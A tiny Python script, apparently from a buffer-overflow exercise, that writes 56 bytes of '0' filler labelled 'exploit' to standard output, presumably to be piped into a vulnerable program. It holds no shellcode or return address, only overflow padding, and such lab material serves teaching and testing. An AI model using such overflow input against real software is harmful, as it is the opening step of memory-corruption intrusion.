#!/usr/bin/python3
import sys

bufsize = 56

exploit  = b'0'*bufsize 

sys.stdout.buffer.write(exploit)
